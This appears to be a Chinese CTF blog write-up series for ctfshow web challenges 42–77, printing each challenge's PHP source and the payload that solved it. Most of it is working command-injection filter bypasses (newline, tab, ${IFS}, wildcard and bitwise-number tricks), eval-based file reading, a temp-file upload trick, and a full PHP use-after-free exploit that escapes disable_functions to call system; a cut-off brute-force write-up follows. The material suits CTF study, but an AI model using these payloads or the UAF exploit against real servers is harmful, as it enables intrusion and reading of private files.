@link: https://ctfer.com*/if(isset($_GET[&#x27;c&#x27;]))&#123; $c=$_GET[&#x27;c&#x27;]; system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;);&#125;else&#123; highlight_file(__FILE__);&#125; 开始了新的一种 自动带了个system();我们只需要给c传命令语句就行了， 但后面带了个&gt;&#x2F;dev&#x2F;null 2&gt;&amp;1”，得想办法让他不影响语句 有很多种过滤方法，最普通的往后面加; 或者加||,%0a等 这里构造payload ?c=ls;?c= tac f*; 得到flag ctfshow&#123;538f23e2-488b-4087-a142-61ae3509ccd7&#125; web43&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-09-05 20:49:30# @Last Modified by: h1xa# @Last Modified time: 2020-09-05 21:32:51# @email: h1xa@ctfer.com# @link: https://ctfer.com*/if(isset($_GET[&#x27;c&#x27;]))&#123; $c=$_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/\\;|cat/i&quot;, $c))&#123; system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;); &#125;&#125;else&#123; highlight_file(__FILE__);&#125; 相比上题，把；cat过滤了 我们使用||或%0a结尾， 构造payload ?c=ls%0a?c=tac f*%0a 得到flag ctfshow&#123;e634303d-c8d5-4c77-8d5f-cf7df77a5da5&#125; web44&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-09-05 20:49:30# @Last Modified by: h1xa# @Last Modified time: 2020-09-05 21:32:01# @email: h1xa@ctfer.com# @link: https://ctfer.com*/if(isset($_GET[&#x27;c&#x27;]))&#123; $c=$_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/;|cat|flag/i&quot;, $c))&#123; system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;); &#125;&#125;else&#123; highlight_file(__FILE__);&#125; 过滤了flag，用f*,fla?????代替 构造payload ?c=tac f*%0a 得到flag ctfshow&#123;fe5488e7-8429-4bbe-a324-58979c9b688b&#125; web45&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-09-05 20:49:30# @Last Modified by: h1xa# @Last Modified time: 2020-09-05 21:35:34# @email: h1xa@ctfer.com# @link: https://ctfer.com*/if(isset($_GET[&#x27;c&#x27;]))&#123; $c=$_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/\\;|cat|flag| /i&quot;, $c))&#123; system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;); &#125;&#125;else&#123; highlight_file(__FILE__);&#125; 过滤了空格，用%09或者&amp;{IFS}代替，构造payload ?c=tac%09f*%0a 得到flag ctfshow&#123;e9c6696b-a4f0-4e09-bedc-52ebf8dae4f4&#125; web46&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-09-05 20:49:30# @Last Modified by: h1xa# @Last Modified time: 2020-09-05 21:50:19# @email: h1xa@ctfer.com# @link: https://ctfer.com*/if(isset($_GET[&#x27;c&#x27;]))&#123; $c=$_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/\\;|cat|flag| |[0-9]|\\\\$|\\*/i&quot;, $c))&#123; system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;); &#125;&#125;else&#123; highlight_file(__FILE__);&#125; 看似是过滤了数字，实际上并不影响%0a,%09的使用，因为是先编码后过滤,过滤了*，就用? 构造payload ?c=tac%09fla?????%0a 得到flag ctfshow&#123;801863f2-cae8-4f4a-9f63-361f80e28622&#125; web47&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-09-05 20:49:30# @Last Modified by: h1xa# @Last Modified time: 2020-09-05 21:59:23# @email: h1xa@ctfer.com# @link: https://ctfer.com*/if(isset($_GET[&#x27;c&#x27;]))&#123; $c=$_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/\\;|cat|flag| |[0-9]|\\\\$|\\*|more|less|head|sort|tail/i&quot;, $c))&#123; system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;); &#125;&#125;else&#123; highlight_file(__FILE__);&#125; 禁用了更多的函数 我们用不到 构造payload ?c=tac%09fla?????%0a 得到flag ctfshow&#123;e37e71b9-7e6c-4b70-803a-72b828cb38ff&#125; web48&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-09-05 20:49:30# @Last Modified by: h1xa# @Last Modified time: 2020-09-05 22:06:20# @email: h1xa@ctfer.com# @link: https://ctfer.com*/if(isset($_GET[&#x27;c&#x27;]))&#123; $c=$_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/\\;|cat|flag| |[0-9]|\\\\$|\\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\\`/i&quot;, $c))&#123; system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;); &#125;&#125;else&#123; highlight_file(__FILE__);&#125; 没啥影响，还是上一题的payload ?c=tac%09fla?????%0a 得到flag ctfshow&#123;b4d605ba-2643-4da1-ac1f-cd8db35f33fb&#125; web49&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-09-05 20:49:30# @Last Modified by: h1xa# @Last Modified time: 2020-09-05 22:22:43# @email: h1xa@ctfer.com# @link: https://ctfer.com*/if(isset($_GET[&#x27;c&#x27;]))&#123; $c=$_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/\\;|cat|flag| |[0-9]|\\\\$|\\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\\`|\\%/i&quot;, $c))&#123; system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;); &#125;&#125;else&#123; highlight_file(__FILE__);&#125; 没啥影响啊，还是接着这样做 构造payload ?c=tac%09fla?????%0a 得到flag ctfshow&#123;034b29e1-fe7b-4366-8ea4-29340c5cc930&#125; web50&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-09-05 20:49:30# @Last Modified by: h1xa# @Last Modified time: 2020-09-05 22:32:47# @email: h1xa@ctfer.com# @link: https://ctfer.com*/if(isset($_GET[&#x27;c&#x27;]))&#123; $c=$_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/\\;|cat|flag| |[0-9]|\\\\$|\\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\\`|\\%|\\x09|\\x26/i&quot;, $c))&#123; system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;); &#125;&#125;else&#123; highlight_file(__FILE__);&#125; 把%09禁用了，我们使用&lt; 构造payload ?c=tac&lt;fl%27%27ag.php|| 得到flag ctfshow&#123;aa42bf15-c3ea-4416-a1db-8fc128ee1a3f&#125; web51&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-09-05 20:49:30# @Last Modified by: h1xa# @Last Modified time: 2020-09-05 22:42:52# @email: h1xa@ctfer.com# @link: https://ctfer.com*/if(isset($_GET[&#x27;c&#x27;]))&#123; $c=$_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/\\;|cat|flag| |[0-9]|\\\\$|\\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\\`|\\%|\\x09|\\x26/i&quot;, $c))&#123; system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;); &#125;&#125;else&#123; highlight_file(__FILE__);&#125; 把tac给禁了，我们换一种，用nl 构造payload ?c=nl&lt;fl%27%27ag.php|| 在源代码中找到flag ctfshow&#123;1e67b744-e71e-4b6c-9b14-ccfe641388d8&#125; 或者用另一种函数rev，反向输出，最后将flag翻转一下即可 web52&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-09-05 20:49:30# @Last Modified by: h1xa# @Last Modified time: 2020-09-05 22:50:30# @email: h1xa@ctfer.com# @link: https://ctfer.com*/if(isset($_GET[&#x27;c&#x27;]))&#123; $c=$_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/\\;|cat|flag| |[0-9]|\\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\\`|\\%|\\x09|\\x26|\\&gt;|\\&lt;/i&quot;, $c))&#123; system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;); &#125;&#125;else&#123; highlight_file(__FILE__);&#125; 把&lt;给禁用了，但是没有禁$,那就用${IFS}， 构造payload ?c=nl$&#123;IFS&#125;fl%27%27ag.php|| 结果发现 1 &lt;?php 2 3 /* 4 # -*- coding: utf-8 -*- 5 # @Author: h1xa 6 # @Date: 2020-09-05 20:49:44 7 # @Last Modified by: h1xa 8 # @Last Modified time: 2020-09-05 20:49:53 9 # @email: h1xa@ctfer.com10 # @link: https://ctfer.com11 12 */13 14 15 $flag=&quot;flag_here&quot;; flag不在这个文件里 我们往上级的目录翻一翻 ?c=ls$&#123;IFS&#125;/|| 在这里，我们看到了有一个flag文件夹，打开看看 ?c=nl$&#123;IFS&#125;/fla&#x27;&#x27;g|| 果然找到了flag ctfshow&#123;953e2696-21d2-4264-8511-f58e9a9f593c&#125; web53&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-09-05 20:49:30# @Last Modified by: h1xa# @Last Modified time: 2020-09-07 18:21:02# @email: h1xa@ctfer.com# @link: https://ctfer.com*/if(isset($_GET[&#x27;c&#x27;]))&#123; $c=$_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/\\;|cat|flag| |[0-9]|\\*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\\`|\\%|\\x09|\\x26|\\&gt;|\\&lt;/i&quot;, $c))&#123; echo($c); $d = system($c); echo &quot;&lt;br&gt;&quot;.$d; &#125;else&#123; echo &#x27;no&#x27;; &#125;&#125;else&#123; highlight_file(__FILE__);&#125; 就改了一下，结尾不用再加||了，构造payload ?c=rev$&#123;IFS&#125;fla????? 得到翻转flag &#125;bccba0f9d27e-d499-0044-1d2d-40920210&#123;wohsftc&quot;=galf web54&lt;?php/*# -*- coding: utf-8 -*-# @Author: Lazzaro# @Date: 2020-09-05 20:49:30# @Last Modified by: h1xa# @Last Modified time: 2020-09-07 19:43:42# @email: h1xa@ctfer.com# @link: https://ctfer.com*/if(isset($_GET[&#x27;c&#x27;]))&#123; $c=$_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/\\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\\`|\\%|\\x09|\\x26|\\&gt;|\\&lt;/i&quot;, $c))&#123; system($c); &#125;&#125;else&#123; highlight_file(__FILE__);&#125; 完全意义上的过滤，真正的不能用这些东西， 用翻转读取 ?c=rev$&#123;IFS&#125;fla????? 得到翻转flag &#125;d05c4c51b088-914b-4fc4-6c3d-a609a5e0&#123;wohsftc&quot;=galf web55&lt;?php/*# -*- coding: utf-8 -*-# @Author: Lazzaro# @Date: 2020-09-05 20:49:30# @Last Modified by: h1xa# @Last Modified time: 2020-09-07 20:03:51# @email: h1xa@ctfer.com# @link: https://ctfer.com*/// 你们在炫技吗？if(isset($_GET[&#x27;c&#x27;]))&#123; $c=$_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/\\;|[a-z]|\\`|\\%|\\x09|\\x26|\\&gt;|\\&lt;/i&quot;, $c))&#123; system($c); &#125;&#125;else&#123; highlight_file(__FILE__);&#125; 过滤了字母，我们采用临时文件上传漏洞 先写一个文件上传网页 &lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;POST数据包POC&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;form action=&quot;https://62170708-6917-4055-af84-98fa1cea65aa.challenge.ctf.show/&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;&lt;!--链接是当前打开的题目链接--&gt; &lt;label for=&quot;file&quot;&gt;文件名：&lt;/label&gt; &lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot;&gt;&lt;br&gt; &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;提交&quot;&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt; 使用时将网址改一下，上传一个txt文件，抓包，添加内容 :8080 //添加端口 ?c=.%20/???/????????[@-[] //POST /后添加 得到响应 HTTP/1.1 200 OKServer: nginx/1.20.1Date: Sat, 05 Jul 2025 12:25:01 GMTContent-Type: text/html; charset=UTF-8Connection: keep-aliveX-Powered-By: PHP/7.3.11Access-Control-Allow-Methods: GET,POST,PUT,DELETE,OPTIONSAccess-Control-Allow-Credentials: trueAccess-Control-Expose-Headers: Content-Type,Cookies,Aaa,Date,Server,Content-Length,ConnectionAccess-Control-Allow-Headers: DNT,X-CustomHeader,Keep-Alive,User-Agent,X-Requested-With,If-Modified-Since,Cache-Control,Content-Type,Authorization,x-auth-token,Cookies,Aaa,Date,Server,Content-Length,ConnectionAccess-Control-Max-Age: 1728000Content-Length: 278&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-09-07 19:40:53# @Last Modified by: h1xa# @Last Modified time: 2020-09-07 19:41:00# @email: h1xa@ctfer.com# @link: https://ctfer.com*/$flag=&quot;ctfshow&#123;d70c8c28-7f40-435b-a1c2-4ac398524812&#125;&quot;; 得到flag web56&lt;?php/*# -*- coding: utf-8 -*-# @Author: Lazzaro# @Date: 2020-09-05 20:49:30# @Last Modified by: h1xa# @Last Modified time: 2020-09-07 22:02:47# @email: h1xa@ctfer.com# @link: https://ctfer.com*/// 你们在炫技吗？if(isset($_GET[&#x27;c&#x27;]))&#123; $c=$_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/\\;|[a-z]|[0-9]|\\\\$|\\(|\\&#123;|\\&#x27;|\\&quot;|\\`|\\%|\\x09|\\x26|\\&gt;|\\&lt;/i&quot;, $c))&#123; system($c); &#125;&#125;else&#123; highlight_file(__FILE__);&#125; 把字母和数字都过滤了，还是采用临时文件上传漏洞 HTTP/1.1 200 OKServer: nginx/1.20.1Date: Sat, 05 Jul 2025 12:28:53 GMTContent-Type: text/html; charset=UTF-8Connection: keep-aliveX-Powered-By: PHP/7.3.11Access-Control-Allow-Methods: GET,POST,PUT,DELETE,OPTIONSAccess-Control-Allow-Credentials: trueAccess-Control-Expose-Headers: Content-Type,Cookies,Aaa,Date,Server,Content-Length,ConnectionAccess-Control-Allow-Headers: DNT,X-CustomHeader,Keep-Alive,User-Agent,X-Requested-With,If-Modified-Since,Cache-Control,Content-Type,Authorization,x-auth-token,Cookies,Aaa,Date,Server,Content-Length,ConnectionAccess-Control-Max-Age: 1728000Content-Length: 278&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-09-07 19:40:53# @Last Modified by: h1xa# @Last Modified time: 2020-09-07 19:41:00# @email: h1xa@ctfer.com# @link: https://ctfer.com*/$flag=&quot;ctfshow&#123;f3529264-fef3-4cfd-a23f-5e393e66a3be&#125;&quot;; 得到flag web57&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-09-05 20:49:30# @Last Modified by: h1xa# @Last Modified time: 2020-09-08 01:02:56# @email: h1xa@ctfer.com# @link: https://ctfer.com*/// 还能炫的动吗？//flag in 36.phpif(isset($_GET[&#x27;c&#x27;]))&#123; $c=$_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/\\;|[a-z]|[0-9]|\\`|\\|\\#|\\&#x27;|\\&quot;|\\`|\\%|\\x09|\\x26|\\x0a|\\&gt;|\\&lt;|\\.|\\,|\\?|\\*|\\-|\\=|\\[/i&quot;, $c))&#123; system(&quot;cat &quot;.$c.&quot;.php&quot;); &#125;&#125;else&#123; highlight_file(__FILE__);&#125; 很贴心的告诉说flag在36.php， system()里还给加了cat和.php，意思就是说让我们传一个c&#x3D;36进去，但数字和字母都被禁用了，小数点也不能用，那就用$,(,),~构造出一个36 最后得到payload ?c=$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(()))))))) 在源代码里找到了flag ctfshow&#123;c2e0ce65-2ce8-4f98-857a-84e3e283f3e9&#125; web58&lt;?php/*# -*- coding: utf-8 -*-# @Author: Lazzaro# @Date: 2020-09-05 20:49:30# @Last Modified by: h1xa# @Last Modified time: 2020-09-07 22:02:47# @email: h1xa@ctfer.com# @link: https://ctfer.com*/// 你们在炫技吗？if(isset($_POST[&#x27;c&#x27;]))&#123; $c= $_POST[&#x27;c&#x27;]; eval($c);&#125;else&#123; highlight_file(__FILE__);&#125; 从这开始，就变成post传参，过滤未知，第一题应该不难， 首先扫一下目录 c=print_r(scandir(&quot;/&quot;)); Array ( [0] =&gt; . [1] =&gt; .. [2] =&gt; .dockerenv [3] =&gt; bin [4] =&gt; dev [5] =&gt; etc [6] =&gt; home [7] =&gt; lib [8] =&gt; media [9] =&gt; mnt [10] =&gt; opt [11] =&gt; proc [12] =&gt; root [13] =&gt; run [14] =&gt; sbin [15] =&gt; srv [16] =&gt; sys [17] =&gt; tmp [18] =&gt; usr [19] =&gt; var ) c=print_r(scandir(&quot;.&quot;)); Array ( [0] =&gt; . [1] =&gt; .. [2] =&gt; flag.php [3] =&gt; index.php ) 发现了flag.php 读一下 c=show_source(&quot;flag.php&quot;); 得到flag ctfshow&#123;e096b4bc-0826-44e0-b101-1fb162547b16&#125; web59&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-09-07 19:40:53# @Last Modified by: h1xa# @Last Modified time: 2020-09-07 19:41:00# @email: h1xa@ctfer.com# @link: https://ctfer.com*/$flag=&quot;ctfshow&#123;a5d88224-d570-4062-a1a4-e46e1d275112&#125;&quot;; 还是show_source,能用就一直梭 web60&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-09-07 19:40:53# @Last Modified by: h1xa# @Last Modified time: 2020-09-07 19:41:00# @email: h1xa@ctfer.com# @link: https://ctfer.com*/$flag=&quot;ctfshow&#123;203e5e58-5d97-4b43-8cd0-1660cb486a59&#125;&quot;; web61&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-09-07 19:40:53# @Last Modified by: h1xa# @Last Modified time: 2020-09-07 19:41:00# @email: h1xa@ctfer.com# @link: https://ctfer.com*/$flag=&quot;ctfshow&#123;fa868657-0163-4778-be4c-835e230eff14&#125;&quot;; web62&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-09-07 19:40:53# @Last Modified by: h1xa# @Last Modified time: 2020-09-07 19:41:00# @email: h1xa@ctfer.com# @link: https://ctfer.com*/$flag=&quot;ctfshow&#123;b5f749b6-3bcf-417c-8d8f-53c103474a90&#125;&quot;; web63&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-09-07 19:40:53# @Last Modified by: h1xa# @Last Modified time: 2020-09-07 19:41:00# @email: h1xa@ctfer.com# @link: https://ctfer.com*/$flag=&quot;ctfshow&#123;84d32eaf-9e32-4473-91b2-7f66586e7783&#125;&quot;; web64&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-09-07 19:40:53# @Last Modified by: h1xa# @Last Modified time: 2020-09-07 19:41:00# @email: h1xa@ctfer.com# @link: https://ctfer.com*/$flag=&quot;ctfshow&#123;61c74961-28b3-4b2a-8e49-8c9e1c00702d&#125;&quot;; web65&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-09-07 19:40:53# @Last Modified by: h1xa# @Last Modified time: 2020-09-07 19:41:00# @email: h1xa@ctfer.com# @link: https://ctfer.com*/$flag=&quot;ctfshow&#123;fb109fb6-b936-48dd-9fce-ffe57ca22afa&#125;&quot;; web66Warning: show_source() has been disabled for security reasons in /var/www/html/index.php(17) : eval()&#x27;d code on line 1 好好好，梭的这么多，终于不能用了， 试一下readfile，好好好，也不能用 还是先扫一下吧 c=print_r(scandir(&quot;.&quot;)); Array ( [0] =&gt; . [1] =&gt; .. [2] =&gt; flag.php [3] =&gt; index.php ) 还是在flag.php的，我们试一下别的方法读取 试一下highlight_file $flag=&quot;秀秀得了,这次不在这里&quot;; 6 再看看目录吧 c=print_r(scandir(&quot;/&quot;)); 有个flag.txt 读一下 ctfshow&#123;709406c7-988b-4659-b38b-a7fef725bb22&#125; web67用上一题一样能读出来 ctfshow&#123;22fcdb01-0a07-4668-b20d-21fc0fe6480f&#125; web68Warning: highlight_file() has been disabled for security reasons in /var/www/html/index.php on line 19 上来就说highlight_file不给用，但毕竟放在flag.txt里 include就读出来了 c=include(&quot;flag.txt&quot;); ctfshow&#123;1e369e41-0b48-4b6d-832f-d8abe26ad96f&#125; web69梭 ctfshow&#123;851b7aef-a568-41b7-9507-eadc62f68d57&#125; web70梭 ctfshow&#123;e72faa3b-1330-4b97-bb61-ad73f970fc21&#125; web71先扫盘 ???????: ?????_?????????() ??? ???? ???????? ??? ???????? ??????? ?? /???/???/????/?????.??? ?? ???? ?? ???????: ???_???() ??? ???? ???????? ??? ???????? ??????? ?? /???/???/????/?????.??? ?? ???? ?? [&quot;.&quot;,&quot;..&quot;,&quot;????.???&quot;,&quot;?????.???&quot;] 你要上天吗？ 看一下源代码 &lt;?php/*# -*- coding: utf-8 -*-# @Author: Lazzaro# @Date: 2020-09-05 20:49:30# @Last Modified by: h1xa# @Last Modified time: 2020-09-07 22:02:47# @email: h1xa@ctfer.com# @link: https://ctfer.com*/error_reporting(0);ini_set(&#x27;display_errors&#x27;, 0);// 你们在炫技吗？if(isset($_POST[&#x27;c&#x27;]))&#123; $c= $_POST[&#x27;c&#x27;]; eval($c); $s = ob_get_contents(); ob_end_clean(); echo preg_replace(&quot;/[0-9]|[a-z]/i&quot;,&quot;?&quot;,$s);&#125;else&#123; highlight_file(__FILE__);&#125;?&gt;你要上天吗？ 大概是说，有个清空过程，我们需要再eval后就结束，可以在结尾加一个exit(); 构造payload c=echo json_encode(scandir(&quot;.&quot;));exit();c=echo json_encode(scandir(&quot;/&quot;));exit(); 拿到flag c=include(&#x27;/flag.txt&#x27;);exit(); web72扫盘时发现，”&#x2F;“,被禁用，用一下glob伪协议 构造payload ?c=echo json_encode(scandir(&quot;glob:///*&quot;));exit(); 扫出了flag0.txt include也无法包含”&#x2F;“,就考虑一下脚本了 c=function ctfshow($cmd) &#123; global $abc, $helper, $backtrace;class Vuln &#123; public $a; public function __destruct() &#123; global $backtrace; unset($this-&gt;a); $backtrace = (new Exception)-&gt;getTrace(); if(!isset($backtrace[1][&#x27;args&#x27;])) &#123; $backtrace = debug_backtrace(); &#125; &#125;&#125;class Helper &#123; public $a, $b, $c, $d;&#125;function str2ptr(&amp;$str, $p = 0, $s = 8) &#123; $address = 0; for($j = $s-1; $j &gt;= 0; $j--) &#123; $address &lt;&lt;= 8; $address |= ord($str[$p+$j]); &#125; return $address;&#125;function ptr2str($ptr, $m = 8) &#123; $out = &quot;&quot;; for ($i=0; $i &lt; $m; $i++) &#123; $out .= sprintf(&quot;%c&quot;,($ptr &amp; 0xff)); $ptr &gt;&gt;= 8; &#125; return $out;&#125;function write(&amp;$str, $p, $v, $n = 8) &#123; $i = 0; for($i = 0; $i &lt; $n; $i++) &#123; $str[$p + $i] = sprintf(&quot;%c&quot;,($v &amp; 0xff)); $v &gt;&gt;= 8; &#125;&#125;function leak($addr, $p = 0, $s = 8) &#123; global $abc, $helper; write($abc, 0x68, $addr + $p - 0x10); $leak = strlen($helper-&gt;a); if($s != 8) &#123; $leak %= 2 &lt;&lt; ($s * 8) - 1; &#125; return $leak;&#125;function parse_elf($base) &#123; $e_type = leak($base, 0x10, 2); $e_phoff = leak($base, 0x20); $e_phentsize = leak($base, 0x36, 2); $e_phnum = leak($base, 0x38, 2); for($i = 0; $i &lt; $e_phnum; $i++) &#123; $header = $base + $e_phoff + $i * $e_phentsize; $p_type = leak($header, 0, 4); $p_flags = leak($header, 4, 4); $p_vaddr = leak($header, 0x10); $p_memsz = leak($header, 0x28); if($p_type == 1 &amp;&amp; $p_flags == 6) &#123; $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr; $data_size = $p_memsz; &#125; else if($p_type == 1 &amp;&amp; $p_flags == 5) &#123; $text_size = $p_memsz; &#125; &#125; if(!$data_addr || !$text_size || !$data_size) return false; return [$data_addr, $text_size, $data_size];&#125;function get_basic_funcs($base, $elf) &#123; list($data_addr, $text_size, $data_size) = $elf; for($i = 0; $i &lt; $data_size / 8; $i++) &#123; $leak = leak($data_addr, $i * 8); if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123; $deref = leak($leak); if($deref != 0x746e6174736e6f63) continue; &#125; else continue; $leak = leak($data_addr, ($i + 4) * 8); if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123; $deref = leak($leak); if($deref != 0x786568326e6962) continue; &#125; else continue; return $data_addr + $i * 8; &#125;&#125;function get_binary_base($binary_leak) &#123; $base = 0; $start = $binary_leak &amp; 0xfffffffffffff000; for($i = 0; $i &lt; 0x1000; $i++) &#123; $addr = $start - 0x1000 * $i; $leak = leak($addr, 0, 7); if($leak == 0x10102464c457f) &#123; return $addr; &#125; &#125;&#125;function get_system($basic_funcs) &#123; $addr = $basic_funcs; do &#123; $f_entry = leak($addr); $f_name = leak($f_entry, 0, 6); if($f_name == 0x6d6574737973) &#123; return leak($addr + 8); &#125; $addr += 0x20; &#125; while($f_entry != 0); return false;&#125;function trigger_uaf($arg) &#123; $arg = str_shuffle(&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;); $vuln = new Vuln(); $vuln-&gt;a = $arg;&#125;if(stristr(PHP_OS, &#x27;WIN&#x27;)) &#123; die(&#x27;This PoC is for *nix systems only.&#x27;);&#125;$n_alloc = 10; $contiguous = [];for($i = 0; $i &lt; $n_alloc; $i++) $contiguous[] = str_shuffle(&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;);trigger_uaf(&#x27;x&#x27;);$abc = $backtrace[1][&#x27;args&#x27;][0];$helper = new Helper;$helper-&gt;b = function ($x) &#123; &#125;;if(strlen($abc) == 79 || strlen($abc) == 0) &#123; die(&quot;UAF failed&quot;);&#125;$closure_handlers = str2ptr($abc, 0);$php_heap = str2ptr($abc, 0x58);$abc_addr = $php_heap - 0xc8;write($abc, 0x60, 2);write($abc, 0x70, 6);write($abc, 0x10, $abc_addr + 0x60);write($abc, 0x18, 0xa);$closure_obj = str2ptr($abc, 0x20);$binary_leak = leak($closure_handlers, 8);if(!($base = get_binary_base($binary_leak))) &#123; die(&quot;Couldn&#x27;t determine binary base address&quot;);&#125;if(!($elf = parse_elf($base))) &#123; die(&quot;Couldn&#x27;t parse ELF header&quot;);&#125;if(!($basic_funcs = get_basic_funcs($base, $elf))) &#123; die(&quot;Couldn&#x27;t get basic_functions address&quot;);&#125;if(!($zif_system = get_system($basic_funcs))) &#123; die(&quot;Couldn&#x27;t get zif_system address&quot;);&#125;$fake_obj_offset = 0xd0;for($i = 0; $i &lt; 0x110; $i += 8) &#123; write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));&#125;write($abc, 0x20, $abc_addr + $fake_obj_offset);write($abc, 0xd0 + 0x38, 1, 4); write($abc, 0xd0 + 0x68, $zif_system); ($helper-&gt;b)($cmd);exit();&#125;ctfshow(&quot;cat /flag0.txt&quot;);ob_end_flush(); ?&gt; 很长的一串，我也看不懂，反正打进去就对了（） web73比上题简单一点，能用以前的方法接着做 web74换一下函数，不能用scandir了，用glob读 构造payload c=echo json_encode(glob(&quot;*&quot;));exit();c=echo json_encode(glob(&quot;/*&quot;));exit(); 扫出来有flagx.txt 用include能读出来 web75-77太玄学了这几题，大题就是说用sql语句，弱密码去读服务器里的flag文件","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://example.com/tags/ctf/"}]},{"title":"ctfshow 爆破(web21-28)已完结","slug":"CTFwp/ctfshow爆破(web21-28)已完结","date":"2025-07-01T16:00:00.000Z","updated":"2025-07-07T13:50:54.757Z","comments":true,"path":"2025/07/02/CTFwp/ctfshow爆破(web21-28)已完结/","permalink":"http://example.com/2025/07/02/CTFwp/ctfshow%E7%88%86%E7%A0%B4(web21-28)%E5%B7%B2%E5%AE%8C%E7%BB%93/","excerpt":"","text":"web21需要用户名和密码才能继续访问 用户名猜一下admin 传到bp里爆破 GET / HTTP/1.1Host: bb20197e-b7cb-42b4-a3ca-0d5a06291357.challenge.ctf.showCache-Control: max-age=0Authorization: Basic MTExMTExMTExOjExMTExMTExMTExMTE=Sec-Ch-Ua: &quot;Chromium&quot;;v=&quot;133&quot;, &quot;Not(A:Brand&quot;;v=&quot;99&quot;Sec-Ch-Ua-Mobile: ?0Sec-Ch-Ua-Platform: &quot;Windows&quot;Accept-Language: 